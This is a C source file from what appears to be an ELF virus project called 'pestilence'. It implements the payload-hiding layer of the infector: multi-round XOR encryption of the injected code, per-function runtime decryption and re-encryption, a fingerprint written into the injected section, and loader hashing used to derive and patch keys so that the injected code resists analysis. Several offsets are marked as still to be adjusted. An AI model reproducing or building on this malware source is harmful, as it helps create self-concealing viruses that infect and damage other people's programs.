#include "pestilence.h"

uint32_t    encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
{
	uint32_t    *file;
	uint32_t    key;
	size_t      i;  
	uint32_t start = info->addr_bis + /*B*/0x10b/*B`*/;
	uint32_t end = (int32_t)(info->addr_bis + BIS_SIZE + MAIN_OFFSET);

	file = (uint32_t *)ptr;
	key = end - start; // key is now offset to jump payload from loader
	key += fingerprint;
	ft_memcpy(info->file + info->offset_bis + /*D*/0xfa/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
	int nb = 0;
	size = (size / 4 ) * 4;
	while (nb < 8)
	{   
		i = 0;
		while (i * 4 < size - 4)
		{   
			file[i] ^= key;
			key += KEY;
			i++;
		}   
		key -= SUB;
		nb++;
	}
	return (key);
}

uint32_t	hash_loader(t_info *info)
{
	uint32_t	hash = 5381;
	size_t		size;
	unsigned char	*str;
	size_t		i = 0;

	str = (unsigned char *)(info->text_begin + info->text_size);
	size = /*F*/0x10/*F`*/; //a modifier taille du loader 0xc5 (0xca - 5)
	while (i < size)
	{
		if (i < /*G*/0x9d/*G`*/ || i > /*G2*/0xa1/*G2`*/) //a modifier debut et fin pos adresse apres pos_rdi dans loader
			hash = ((hash << 5) + hash) + str[i];
		i++;
	}
// 	uint32_t key = decrypt_func(info, &patch_loader, 0x79, 0);
	patch_loader(info, hash);
// 	reencrypt_func(info, &patch_loader, 0x79, key);
	str = (unsigned char *)(info->file + info->offset_bis);
	size = 0x10; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
	i = 0;
	while (i < size)
	{
		if (i < /*H*/0x90/*H`*/ || i > /*H2*/0x94/*H2`*/) // modifier debut et fin pos adresse apres ... dans bis
			hash = ((hash << 5) + hash) + str[i];
		i++;
	}
	return (hash);
}

uint32_t	decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb_func)
{
	size_t		i;
	uint32_t	*str;
	uint32_t	key;
	int		nb = 0;

// 	dprintf(1, "%#lx\n", size);
	if (info->in_pestilence == 1)
		return (0);
	key = get_key_func(nb_func);
	key -= hash_func(addr, size, 5381);
	size = (size >> 2) << 2;
	str = (uint32_t *)addr;
	size -= 4;
	size /= 4;
// 	key -= size;
	while (nb < 8)
	{
		i = size;
		key += SUB;
		while (i > 0)
		{
			key -= KEY;
			str[i - 1] ^= key;
			i--;
		}
		nb++;
	}
	return (key);
	
}

void		reencrypt_func(t_info *info, void *addr, size_t size, uint32_t key)
{
	if (info->in_pestilence == 1)
		return ;
	encrypt_func(addr, size, key);
}

uint32_t	encrypt_func(void *addr, size_t size, uint32_t key)
{
	size_t		i;
	uint32_t	*str;
	int		nb = 0;

	size = (size >> 2 ) << 2;
	str = (uint32_t *)addr;
	while (nb < 8)
	{
		i = 0;
		while (i * 4 < size - 4)
		{
			str[i] ^= key;
			key += KEY;
			i++;
		}
		key -= SUB;
		nb++;
	}
	return (key);
}

uint32_t	hash_func(void *addr, size_t size, uint32_t hash)
{
	unsigned char	*str;
	size_t		i = 0;

	str = (unsigned char *)addr;
	while (i < size)
	{
		hash = ((hash << 5) + hash) + str[i];
		i++;
	}
	return (hash);

}

void		patch_key(t_info *info, uint32_t key)
{
	uint32_t val;
	uint32_t hash;

	hash = hash_loader(info);
	// Key in loader
	val = key - hash;
	ft_memcpy(info->file + info->offset_bis + /*C*/0x90/*C`*/, &val, 4); // 0x78 is addr of key in bis
}

void		save_key(t_info *info, uint32_t hash, int nb)
{
	void	*addr;

	addr = &get_key_func - (size_t)(&ft_memcpy);
	addr = info->file + info->offset_bis + BIS_SIZE + (size_t)addr + 6 + (nb * 10);
	ft_memcpy(addr, &hash, 4);
}

void		crypt_payload(t_info *info, uint32_t fingerprint)
{
// 	size_t		tab[3] = {(size_t)&patch_loader, (size_t)&patch_payload, (size_t)&patch_bis};
	size_t		size;
	size_t		offset;
	uint32_t	hash;
	int		i = 0;
	
	// decrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], x);
	// reencrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], key);

	while (i < 10)
	{
		size = info->tab_addr[i + 1] - info->tab_addr[i];
		offset = info->tab_addr[i] - (size_t)(&ft_memcpy);
		if (info->in_pestilence == 0)
		{
			decrypt_func(info, info->file + info->offset_bis + BIS_SIZE + offset, size, i);
		}
		hash = hash_func((void *)(info->tab_addr[i]), size, fingerprint);
		hash = encrypt_func(info->file + info->offset_bis + BIS_SIZE + offset, size, hash);
// 		hash += size;
		hash += hash_func(info->file + info->offset_bis + BIS_SIZE + offset, size, 5381);
		save_key(info, hash, i);
		i++;
	}
}
